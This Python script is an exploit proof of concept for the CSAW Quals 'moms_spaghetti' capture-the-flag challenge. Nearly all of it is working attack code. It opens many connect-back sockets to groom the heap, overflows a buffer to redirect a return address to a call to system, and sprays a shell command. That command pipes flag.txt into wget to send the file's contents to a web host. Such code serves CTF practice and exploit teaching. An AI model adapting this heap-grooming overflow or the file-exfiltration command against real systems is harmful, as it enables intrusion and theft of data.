#!/usr/bin/env python

__description__ =   "Exploit PoC for CSAW Quals Exploit500 moms_spaghetti"
__author__ =        "Brandon Edwards"                                           
__email__ =         "drraid@gmail.com"                                          
__copyright__ =     "Copyright (c) 2016, Brandon Edwards. All rights reserved." 
__license__ =       "Revised BSD License, see LICENSE.TXT" 

import os
import socket
import struct
import sys
from multiprocessing import Process

def tcp_connect(ip, port):
    s = socket.socket()
    s.connect((ip, port))
    return s

class ExploitController:
    def __init__(self, remote_ip, remote_port):
        self.remote_ip = remote_ip
        self.remote_port = int(remote_port)
        self.listen_socket = socket.socket()
        self.accepted_connections = list()

    def listen(self, connection_count, connect_back_ip, connect_back_port):
        print "[*] setting up listening socket on port %i" % connect_back_port
        self.listen_socket.bind((connect_back_ip, connect_back_port))
        self.listen_socket.listen(connection_count)

    def trigger(self, connect_back_ip, connect_back_port):
        groom_size = 0x7FF1
        trigger_size = 0x3FF1
        total_connection_count = 51
        print "[*] setting up %i listening sockets" % total_connection_count
        self.listen(total_connection_count, connect_back_ip, connect_back_port)
        print "[*] constructing requestor packet"
        packet = struct.pack("<H", total_connection_count)
        packet += struct.pack("<H", connect_back_port)
        connect_socket = tcp_connect(self.remote_ip, self.remote_port)
        connect_socket.send(packet)

        return_address_offset = 0xDC
        address_of_ret_instruction = struct.pack("<I", 0x08049011)
        address_of_call_system = struct.pack("<I", 0x080496de)
        opcode = "T "
        payload = "\xFF" * (trigger_size + 0x40)
        #payload += make_pattern(0x100)
        payload += "A" * return_address_offset
        #payload += "$$$$"
        # ret to hop skip over
        payload += address_of_ret_instruction 
        payload += address_of_call_system
        payload += "\x00\x40"
        payload += "\x80\x80\x80\x80"
        packet = self.build_packet(opcode, groom_size, payload) 

        print "[*] grooming heap..."
        for connection_counter in xrange(0, total_connection_count - 1):
            # the heap should be deterministic, 
            # and thus the calculation for where to place the FF byte
            # should in theory be precise, but a little overlap here 
            # will not interfere with any other mechanism, so is worth 
            # using to ensure success
            #offset = trigger_size + 0x40
            remote_socket, client_info = self.listen_socket.accept()
            remote_socket.send(packet)
            result = remote_socket.recv(1024)

        print "[*] constructing trigger"
        packet = "\x01\x00"
        padding_length = trigger_size - 5

        command = 'echo -n http://127.0.0.1/|cat - flag.txt|wget -i - ;'
    
        command_length = len(command)
        command_spray_count = padding_length / command_length
        command_spray = command * command_spray_count
        packet += struct.pack("<H", padding_length)
        packet += "\x04\x00\x00\x00"
        packet += command_spray
        packet += "A" * (padding_length-(command_length * command_spray_count))
        packet += "\x84\x7F\xFF\xFF" 
        remote_socket, client_info = self.listen_socket.accept()
        print "[*] trigger packet size: 0x%08x"  % len(packet)
        remote_socket.send(packet)
        print "[*] reading socket...(should fail)"
        result = remote_socket.recv(1024)
            
    def recv(self, socket_id, length=256):
        return self.accepted_connections[socket_id].recv(length)

    def send(self, socket_id, data):
        print "[*] sending [%s] to [%i]" % (data.encode('hex'), socket_id)
        result = self.accepted_connections[socket_id].send(data)
        print "[*] sent %i bytes" % result

    def encode_integer(self, value):
        result = '\x84'
        result += struct.pack(">I", value)
        return result

    def build_packet(self, packet_opcode, offset=0, pad_data=''):
        # 16bit version hardcoded to 1
        packet = "\x01\x00"

        opcode_length = len(packet_opcode)
        packet_data = self.encode_integer(opcode_length)
        packet_data += packet_opcode

        # offset to data (16bit)
        padding_length = offset - opcode_length 

        packet += struct.pack("<H", padding_length) 
        # packet data length
        packet += struct.pack("<I", len(packet_data))
        packet += pad_data
        packet += ('\xFF' * (padding_length - len(pad_data)))
        packet += packet_data
        return packet
        
    def accept_connections(self, connection_count):
        counter = 0
        while counter < connection_count:
            counter += 1
            print "[*] accepting connection %i/%i" % (counter, connection_count)
            remote_socket, client_info = self.listen_socket.accept()
            self.accepted_connections.append(remote_socket)

def main():
    try:
        target_ip = sys.argv[1]
        target_port = sys.argv[2]
    except:
        target_ip = '127.0.0.1'
        target_port = 24242

    listen_ip = '127.0.0.1'
    listen_port = os.getpid() % 100
    listen_port += 8000
    exploit_controller = ExploitController(target_ip, target_port)
    exploit_controller.trigger(listen_ip, listen_port)

if __name__ == "__main__":
    main()
